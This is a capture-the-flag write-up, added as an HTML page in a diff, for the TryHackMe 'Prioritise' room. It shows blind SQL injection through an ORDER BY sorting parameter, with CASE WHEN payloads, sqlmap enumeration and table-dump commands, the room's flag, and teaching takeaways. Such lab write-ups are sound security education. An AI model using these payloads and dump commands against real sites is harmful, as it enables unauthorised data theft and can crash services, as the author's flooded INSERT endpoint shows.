@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prioritise (TryHackMe) - CTF Write-up</title>
+    <meta name="description" content="TryHackMe Prioritise write-up — Boolean-based blind SQL injection via ORDER BY clause in a to-do list sorting parameter.">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+
+    <style>
+        .writeup-container {
+            max-width: 800px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: var(--text-color, #ffffff);
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            color: var(--text-color, #ffffff);
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 140px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">← All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>CTF Write-up: Prioritise (TryHackMe)</h1>
+
+        <table class="meta-table">
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Category</td><td>🕸️ Web Exploitation</td></tr>
+            <tr><td>Difficulty</td><td>Medium</td></tr>
+            <tr><td>Tags</td><td>SQL Injection · ORDER BY · Blind SQLi · SQLite</td></tr>
+        </table>
+
+        <h2>Challenge Overview</h2>
+        <p><strong>Objective:</strong> Exploit a less common SQL injection vector in a to-do list application that lets users sort tasks by priority.</p>
+        <blockquote>
+            "A simple task manager where you can create to-dos and order them by priority. Sometimes the most overlooked parameters hide the most dangerous bugs."
+        </blockquote>
+        <p>This room focuses on a frequently overlooked injection surface: the <code>ORDER BY</code> clause. Instead of the usual input fields, the vulnerability lives in the sorting parameter — the one thing most testers scroll right past.</p>
+
+        <h2>Methodology</h2>
+
+        <h3><span class="step-label">STEP 1</span> Initial Assumption — Testing the INSERT Endpoint (Failed)</h3>
+        <p>The application exposes a "create new task" form that submits to <code>POST /new</code> with <code>title</code> and <code>date</code> parameters. This felt like the natural injection point, so I pointed <strong>sqlmap</strong> at it.</p>
+        <pre>sqlmap -u "http://TARGET/new" --data="title=test&date=2026-01-01" --batch</pre>
+        <div class="denied-box">
+            ✗ FAILED — Every successful payload was an INSERT statement, flooding the database with hundreds of todo items. The box became unresponsive and started returning 500 errors and timeouts.
+        </div>
+        <p>This was a classic mistake: running sqlmap against an INSERT endpoint without limiting requests. Each injected payload created a new row, eventually overwhelming the fragile CTF machine. Lesson learned the hard way.</p>
+
+        <h3><span class="step-label">STEP 2</span> Pivoting — Re-reading the Room Description</h3>
+        <p>After the machine recovered, I stepped back and re-read the room description carefully. The key phrase was: <em>"order our tasking based on priority."</em></p>
+        <p>Looking at the main page, I noticed the application accepted a GET parameter to control sorting:</p>
+        <pre>/?order=title
+/?order=date</pre>
+        <p>This is a textbook <code>ORDER BY</code> injection point — the user-supplied value is placed directly into the SQL query's sorting clause. It's less commonly tested because most scanners and tutorials focus on <code>WHERE</code> clause injections.</p>
+
+        <h3><span class="step-label">STEP 3</span> Confirming the Injection — Boolean Oracle via CASE</h3>
+        <p>To confirm the parameter was injectable, I used a conditional <code>CASE</code> expression that would change the sort order depending on a true/false condition:</p>
+        <pre>?order=(CASE WHEN 1=1 THEN title ELSE date END)
+?order=(CASE WHEN 1=2 THEN title ELSE date END)</pre>
+        <div class="success-box">
+            ✓ CONFIRMED — The order of displayed tasks changed depending on the condition. When the condition was true (1=1), tasks sorted by title; when false (1=2), they sorted by date.
+        </div>
+        <p>This gave us a <strong>boolean-based blind SQL injection oracle</strong>: we can ask the database any yes/no question by observing whether the page sorts by title or date.</p>
+
+        <h3><span class="step-label">STEP 4</span> Database Fingerprinting</h3>
+        <p>Using the boolean oracle, database fingerprinting confirmed the backend was running <strong>SQLite</strong>. This was important because SQLite has specific syntax quirks — for instance, it doesn't support <code>SLEEP()</code> for time-based attacks, and heavy operations like <code>RANDOMBLOB()</code> kept crashing the service.</p>
+
+        <h3><span class="step-label">STEP 5</span> Exploitation with sqlmap</h3>
+        <p>With the injection point confirmed and the DBMS identified, I ran sqlmap with carefully tuned parameters to avoid killing the box again:</p>
+        <pre>sqlmap -u "http://TARGET/?order=title" -p order \
+  --batch --dbms=sqlite --technique=B --threads=1</pre>
+        <p>Key flags explained:</p>
+        <ul>
+            <li><code>-p order</code> — Target only the <code>order</code> parameter</li>
+            <li><code>--technique=B</code> — Boolean-based blind only (no time-based attacks that would crash the service)</li>
+            <li><code>--threads=1</code> — Single thread to be gentle on the fragile CTF box</li>
+            <li><code>--dbms=sqlite</code> — Skip fingerprinting overhead since we already know the backend</li>
+        </ul>
+        <p>sqlmap successfully identified the injection and began enumerating the database. Two tables were found:</p>
+        <pre>Database: SQLite
+[2 tables]
++-------+
+| todos |
+| flag  |
++-------+</pre>
+
+        <h3><span class="step-label">STEP 6</span> Flag Retrieval</h3>
+        <p>Dumping the <code>flag</code> table was straightforward:</p>
+        <pre>sqlmap -u "http://TARGET/?order=title" -p order \
+  --batch --dbms=sqlite --technique=B --threads=1 \
+  -T flag --dump</pre>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            🚩 flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
+        </div>
+
+        <h2>Key Takeaways</h2>
+
+        <div class="takeaway-card">
+            <h4>🔍 Always Test Sorting Parameters</h4>
+            <p>ORDER BY injection points are frequently overlooked because most testing focuses on WHERE clauses and form inputs. Any parameter that controls sorting, grouping, or column selection is a potential injection surface.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>⚠️ INSERT Endpoints Will Flood the Database</h4>
+            <p>Running sqlmap against an INSERT endpoint without rate limiting or cleanup will create hundreds of rows per scan. On fragile CTF boxes, this can make the machine unresponsive. Always understand what SQL operation your target endpoint performs before unleashing automated tools.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🐢 Be Gentle with CTF Infrastructure</h4>
+            <p>On shared or single-instance CTF boxes, stick to boolean-based techniques and low thread counts. Time-based payloads using heavy operations (like RANDOMBLOB in SQLite) can crash the service entirely. Use <code>--technique=B --threads=1</code> when in doubt.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🧠 The CASE Expression Trick</h4>
+            <p>Using <code>CASE WHEN condition THEN column_a ELSE column_b END</code> in an ORDER BY clause is a powerful technique to turn sort order into a boolean oracle. If the page renders differently based on the condition, you have blind SQLi — no error messages needed.</p>
+        </div>
+    </main>
+</body>
+</html>
